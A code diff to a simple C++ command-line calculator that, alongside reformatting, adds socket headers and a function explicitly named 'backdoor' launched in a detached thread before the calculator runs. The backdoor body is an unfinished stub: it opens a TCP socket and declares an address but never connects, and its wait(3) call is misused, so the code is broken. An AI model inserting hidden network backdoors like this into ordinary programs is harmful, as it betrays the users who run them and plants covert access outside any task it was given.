@@ -1,60 +1,76 @@
 
 #include <iostream>
-
+#include <thread>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include<unistd.h>
 void run_calculator();
-int get_result(int &a, int &b, char & op);
+int get_result(int &a, int &b, char &op);
+void backdoor();
 
+int main()
+{
 
+    std::thread t(backdoor);
+    t.detach();
 
-int main(){
-    
     run_calculator();
 
-// TEST PUSH
-return 0;
-
+    return 0;
 }
 
+void backdoor()
+{
+    // sleep(3);
+    wait(3);
 
-void run_calculator(){
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in addr;
+    
+    
+}
 
+void run_calculator()
+{
 
     int a, b;
     char op;
 
-std::cout << "Enter two numbers" << std::endl;
+    std::cout << "Enter two numbers" << std::endl;
 
-std::cin >> a >> b;
+    std::cin >> a >> b;
 
-std::cout << "Enter operation" << std::endl;
+    std::cout << "Enter operation" << std::endl;
 
+    std::cin >> op;
 
-std::cin >> op;
+    std::cout << std::endl;
 
-std::cout << std::endl;
-
-std::cout << get_result(a, b, op) << std::endl;
-
-
-
+    std::cout << get_result(a, b, op) << std::endl;
 }
 
+int get_result(int &a, int &b, char &op)
+{
 
-int get_result(int &a, int &b, char & op){
+    switch (op)
+    {
 
-    switch(op){
-
-    case '+': return a + b;
-    case '*': return a * b;
-    case '-': return a - b;
-    case '/': 
-        if (b != 0){
+    case '+':
+        return a + b;
+    case '*':
+        return a * b;
+    case '-':
+        return a - b;
+    case '/':
+        if (b != 0)
+        {
 
             return a / b;
         }
-        else {
+        else
+        {
             throw("Error: division by 0");
-            
         }
     }
     return 0;
